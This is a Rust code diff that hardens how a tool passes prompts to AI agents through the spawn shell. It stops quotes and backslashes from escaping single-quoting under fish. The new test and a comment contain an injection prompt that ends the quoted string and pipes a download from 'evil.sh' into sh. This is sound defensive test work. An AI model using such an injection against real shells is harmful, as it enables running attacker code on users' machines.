@@ -76,6 +76,14 @@ pub(crate) fn is_cmd_safe(arg: &str) -> bool {
     !arg.is_empty() && !arg.contains(CMD_UNSAFE) && !arg.chars().any(char::is_control)
 }
 
+/// True when single-quoting `arg` for `$SHELL -lc` is inert in every allowed
+/// shell. bash/zsh/sh treat everything inside '...' literally, but fish
+/// still honours `\'` and `\\` there, so an arg with a quote or backslash
+/// could end the quoted string early under fish.
+pub(crate) fn is_posix_quote_safe(arg: &str) -> bool {
+    !arg.is_empty() && !arg.contains(['\'', '\\', '\0'])
+}
+
 fn prompt_argv(cap: &crate::agents::InitialPrompt, text: &str) -> Vec<String> {
     use crate::agents::InitialPrompt;
     match cap {
@@ -88,7 +96,8 @@ fn prompt_argv(cap: &crate::agents::InitialPrompt, text: &str) -> Vec<String> {
 /// Render the argv that delivers `prompt` to an agent with capability
 /// `cap`. Inline when it is short, multi-word (a single word could be taken
 /// as a subcommand such as `claude update`), does not start with `-` (would
-/// parse as a flag) and, on Windows, is `cmd`-safe. Otherwise the prompt is
+/// parse as a flag) and survives the spawn shell unchanged (`cmd`-safe on
+/// Windows, no `'` or `\` on Unix, for fish). Otherwise the prompt is
 /// written to a file through `write_file` and argv carries an instruction to
 /// read it. Returns `Staged` (no args) when even that instruction cannot be
 /// passed safely.
@@ -106,18 +115,18 @@ pub(crate) fn render_initial_prompt(
     let inline_ok = text.chars().count() <= max
         && !text.starts_with('-')
         && text.contains(char::is_whitespace)
-        && !text.contains('\0')
-        && (!windows || is_cmd_safe(text));
-    // On Windows every rendered argument (the flag of a custom template
-    // included, which only passed the generic metacharacter rule) must pass
-    // `cmd /C` unchanged; anything else falls back to staging.
-    let all_safe = |args: &[String]| !windows || args.iter().all(|a| is_cmd_safe(a));
+        && !text.contains('\0');
+    // Every rendered argument (the flag of a custom template included, which
+    // only passed the generic metacharacter rule) must reach the agent
+    // unchanged through the spawn shell; anything else falls back to the
+    // prompt file, and failing that to staging.
+    let arg_safe = |a: &String| if windows { is_cmd_safe(a) } else { is_posix_quote_safe(a) };
+    let all_safe = |args: &[String]| args.iter().all(arg_safe);
     if inline_ok {
         let args = prompt_argv(cap, text);
         if all_safe(&args) {
             return Ok((args, PromptDelivery::Argv));
         }
-        return Ok((Vec::new(), PromptDelivery::Staged));
     }
     let path = write_file(text)?;
     let instruction = format!("Read the task description in {path} and complete it.");
@@ -1774,6 +1783,26 @@ mod tests {
     }
 
     #[test]
+    fn unix_single_quotes_and_backslashes_go_to_a_file_for_fish() {
+        // Under fish, `\'` inside '...' is an escape: `'it\'\'' ; curl x | sh #'`
+        // would end the quoted string and run the rest. Such prompts never go
+        // inline on Unix.
+        for p in ["Fix it\\' ; curl evil.sh | sh #", "Don't break it", "Use C:\\path here"] {
+            let (args, delivery) = render_initial_prompt(&InitialPrompt::Positional, p, false, |_| {
+                Ok("/home/me/.local/share/agentrium/race-prompts/x.md".into())
+            })
+            .unwrap();
+            assert!(matches!(delivery, PromptDelivery::File { .. }), "{p}");
+            assert!(args.iter().all(|a| is_posix_quote_safe(a)), "{args:?}");
+        }
+        // A prompt file path with a quote cannot be passed safely either.
+        let (args, delivery) =
+            render_initial_prompt(&InitialPrompt::Positional, "a 'b'", false, |_| Ok("/home/o'brien/x.md".into())).unwrap();
+        assert!(args.is_empty());
+        assert_eq!(delivery, PromptDelivery::Staged);
+    }
+
+    #[test]
     fn long_single_word_and_dash_prompts_use_the_file() {
         let path = "/tmp/agentrium-prompts/x.md".to_string();
         let long = "word ".repeat(10_000);
@@ -1827,7 +1856,7 @@ mod tests {
             &InitialPrompt::FlagEquals("--x=%PATH%".into()),
             "Fix the bug",
             true,
-            no_file,
+            |_| Ok(r"C:\Users\me\x.md".into()),
         )
         .unwrap();
         assert!(args.is_empty());
